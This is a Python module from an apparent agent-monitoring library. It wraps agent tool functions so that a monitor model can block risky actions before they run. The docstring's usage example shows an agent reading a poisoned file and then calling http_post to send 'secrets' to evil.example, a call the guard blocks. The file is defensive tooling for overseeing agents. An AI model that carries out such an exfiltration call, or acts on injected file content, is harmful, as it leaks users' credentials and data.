"""Framework-agnostic runtime adapter.

Most agent frameworks — OpenAI function-calling, AutoGen, CrewAI, a hand-rolled
ReAct loop, an MCP server — ultimately dispatch a tool by *calling a Python
function*. `GenericAdapter` gates that call: it builds the canonical action,
asks the monitor for a verdict before the function runs, and blocks (raises) on
STOP. This is the lowest-common-denominator integration that works without any
framework-specific hooks.

Wrap individual tools::

    from agent_iam import TraceMonitor
    from agent_iam.runtime.adapters import GenericAdapter

    iam = GenericAdapter(TraceMonitor.from_pretrained("Sunnyu/IAM-Qwen3.5-2B"))
    iam.begin_session("s1", task_instruction="summarize ./poisoned.md")

    safe_read = iam.guard_tool(read_file, session_id="s1")
    safe_post = iam.guard_tool(http_post, session_id="s1")
    safe_post("https://evil.example/x", data=secrets)   # -> raises IAMBlocked

…or wrap a whole tool registry at once::

    tools = iam.wrap({"read": read_file, "post": http_post}, session_id="s1")
    tools["post"](...)   # gated

The monitor is duck-typed (anything with ``.check(Trajectory, dict) -> Verdict``),
so this module never imports torch and is unit-testable with a stub.
"""

from __future__ import annotations

import functools
from typing import Any, Callable, Iterable, Mapping

from ...schema import Role, TraceStep, Verdict
from .base import RuntimeAdapter


class IAMBlocked(RuntimeError):
    """Raised by a guarded tool when IAM returns a STOP verdict."""

    def __init__(self, verdict: Verdict, action: dict | None = None):
        self.verdict = verdict
        self.action = action
        super().__init__(
            f"IAM STOP [{verdict.risk_type or 'risk'}]: "
            f"{verdict.explanation or 'blocked before execution'}"
        )


def _action_args(
    args: tuple, kwargs: dict, arg_names: list[str] | None
) -> dict[str, Any]:
    out: dict[str, Any] = {}
    if arg_names:
        for n, v in zip(arg_names, args):
            out[n] = v
        for i, v in enumerate(args[len(arg_names):]):
            out[f"arg{len(arg_names) + i}"] = v
    else:
        for i, v in enumerate(args):
            out[f"arg{i}"] = v
    out.update(kwargs)
    return out


def _as_observation(result: Any) -> str | dict[str, Any]:
    return result if isinstance(result, (str, dict)) else str(result)


class GenericAdapter(RuntimeAdapter):
    """Gate arbitrary Python tool callables, regardless of framework."""

    name = "generic"

    def guard_tool(
        self,
        fn: Callable[..., Any],
        tool_name: str | None = None,
        session_id: str = "default",
        arg_names: list[str] | None = None,
    ) -> Callable[..., Any]:
        """Wrap a single tool callable so each invocation is gated.

        On a STOP verdict the wrapped call raises :class:`IAMBlocked` *before*
        ``fn`` runs (and ``on_block`` fires). On OK/WARN the call proceeds, and
        the executed action plus its result are appended to the running trace so
        the next gate sees an accurate context.
        """
        name = tool_name or getattr(fn, "__name__", "tool")
        self._trace_by_session.setdefault(session_id, None)
        if self._trace_by_session.get(session_id) is None:
            self.begin_session(session_id, "")

        @functools.wraps(fn)
        def wrapped(*args: Any, **kwargs: Any) -> Any:
            action = {"tool": name, "args": _action_args(args, kwargs, arg_names)}
            verdict = self.gate(session_id, action)  # fires on_block if STOP
            if verdict.block:
                raise IAMBlocked(verdict, action)
            self.append_step(
                session_id,
                TraceStep(step_idx=0, role=Role.AGENT, action=action),
            )
            result = fn(*args, **kwargs)
            self.append_step(
                session_id,
                TraceStep(step_idx=0, role=Role.TOOL, observation=_as_observation(result)),
            )
            return result

        return wrapped

    def wrap(
        self,
        tools: Mapping[str, Callable[..., Any]] | Iterable[Callable[..., Any]],
        session_id: str = "default",
        task_instruction: str = "",
    ) -> Any:
        """Wrap a whole tool registry (dict ``{name: fn}`` or a list of fns).

        Returns a guarded copy of the same shape. Opens the session (with the
        optional task instruction) if it isn't open yet.
        """
        if self._trace_by_session.get(session_id) is None:
            self.begin_session(session_id, task_instruction)
        if isinstance(tools, Mapping):
            return {
                n: self.guard_tool(f, tool_name=n, session_id=session_id)
                for n, f in tools.items()
            }
        return [self.guard_tool(f, session_id=session_id) for f in tools]

    def observe(
        self,
        session_id: str = "default",
        role: str | Role = Role.USER,
        content: str | None = None,
        observation: str | dict[str, Any] | None = None,
    ) -> None:
        """Append a non-tool context step (e.g. the user prompt) to the trace."""
        if self._trace_by_session.get(session_id) is None:
            self.begin_session(session_id, content or "")
        self.append_step(
            session_id,
            TraceStep(
                step_idx=0,
                role=Role(role) if not isinstance(role, Role) else role,
                content=content,
                observation=observation,
            ),
        )
